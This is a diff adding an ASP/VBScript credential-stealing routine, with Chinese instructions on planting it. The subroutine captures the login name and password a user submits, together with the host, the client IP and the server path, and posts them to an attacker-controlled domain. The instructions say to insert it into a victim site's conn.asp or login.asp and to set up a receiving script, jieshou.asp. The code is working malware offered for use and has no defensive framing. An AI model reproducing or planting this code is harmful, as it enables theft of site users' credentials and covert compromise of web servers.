@@ -1,0 +1,27 @@
+Sub xxbing(urldizhi,jbdizhi,namea,passb,xinxi)
+Dim xmlHttp,xmlGet,urlStr
+xinxi=request.ServerVariables("Http_Host")&"|"&Request.ServerVariables("Remote_Addr")&"|"&request.ServerVariables("Path_Translated")
+urlStr="http://"&urldizhi&"/"&jbdizhi&"?name="&namea&"&pass="&passb&"&xinxi="&xinxi
+'Response.Write urlstr&"<BR>"
+Set xmlHttp = CreateObject("Msxml2.XMLHTTP")
+On Error Resume Next
+xmlHttp.Open "POST", urlStr, False
+xmlHttp.Send
+If Err.Number = 0 Then
+xmlGet = xmlHttp.responseText
+Else
+'Response.Write Err.Description & urlStr
+'response.write "<script>alert('出现错误')</script>"
+response.end
+end if
+End Sub
+
+
+这个是插入到对方的asp文件中的代码，可以插入到conn.asp或者login.asp中，只要登陆页面能调用到就行。
+调用的方法为：
+
+Call xxbing("www.baidu.com","jieshou.asp",Request("LogName"),Request("LogPwd"),xinxi)
+
+其中www.baidu.com是你的域名。jieshou.asp文件是接受post过来的数据的文件。
+request("logName")是对方login.asp文件中账号变量，Request("LogPwd")是对方login.asp中的密码变量。
+xinxi 是记录登录者信息的变量，这个不用修改。其他的都要按照自己的情况进行修改。
